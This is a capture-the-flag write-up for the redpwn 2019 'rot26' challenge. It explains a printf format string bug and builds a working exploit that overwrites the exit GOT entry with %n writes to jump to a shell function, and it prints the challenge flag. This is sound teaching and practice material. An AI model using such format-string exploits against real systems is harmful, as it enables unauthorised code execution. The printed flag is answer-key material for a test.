In this pwn challenge with the following description:
```
nc chall2.2019.redpwn.net 4003
```
we were given a ELF and it's source code (look at rot26 and rot26.c):

Reading the source code it seems that the software does a rot26 encryption of a string passed via stdin, let's try it: 

```bash
$ ./rot26
asd
asd
```

Of course rot26 is a shift of 26 character, so nothing will change. Then there is a function that executes a system("/bin/sh") so this piece of code will drop us a shell:

```c
void winners_room(void)
{
        puts("Please, take a shell!");
        system("/bin/sh");
        exit(EXIT_SUCCESS);
}
```

This function, however, is never called so we must use some bugs to overwrite eip register and redirect code execution. Stack overflow though is not feasible because the read is made in a safe way:

```c
char buf[4096];
...
fgets(buf, sizeof(buf), stdin);
```

In the end nothing seems to be wrong, except one particular:

```c
char sanitized[4096];
...
rot26(sanitized, buf, sizeof(sanitized));
printf(sanitized);
exit(EXIT_FAILURE);
```

We are using printf to print a buffer without the use of a format string, this allow us to perform a format string exploit. Let's verify this bug:

```bash
$ ./rot26
%x %x %x %x %x
ffe39f9c 1000 8048791 0 0
```

We have found the right path! Now we need only to find a way to redirect the code with the printf. It's important to notice that the only function called after the print statement is exit, we can overwrite the plt entry so whenever the program calls exit(), it calls our shell function!

Firstly we need the address to rewrite:

```
$ gdb rot26
gdb-peda$ x exit
0x80484a0 <exit@plt>:	0xa02025ff
```

Then we need the address of the shell function:

```
gdb-peda$ x winners_room 
0x8048737 <winners_room>:	0x53e58955
```

Then we find the right offset of the first word of our input:

```
./rot26 
AAAA %x %x %x %x %x %x %x %x %x %x
AAAA ffabde3c 1000 8048791 0 0 0 41414141 20782520 25207825 78252078
```

So the offset is 7, now we decide to write the address in two steps, first we will write the lower part [0x8737], then the higher part [0x804], after some calculation the exploit string is built by:

```python
shell = 0x8048737
exitplt = 0x804a020

exploit = ''
exploit += p32(exitplt) #set first address to write to
exploit += p32(exitplt+2) #set second address to write to
exploit += '%34607x' #print enough character to reach shell[4:]
exploit += '%7$n' #write number of character printed in first address
exploit += '%32973x' #print enough character to reach shell[0:4]
exploit += '%8$n' #write number of character printed in first address
```

Executing it on the server will lead in a bunch of crap printed and at the end the shell:
```bash
./exploit
...
                                                    1000
Please, take a shell!
$ ls
Makefile
bin
dev
flag.txt
lib
lib32
lib64
rot26
rot26.c
$ cat flag.txt
flag{w4it_d03s_r0t26_4ctu4lly_ch4ng3_4nyth1ng?}
```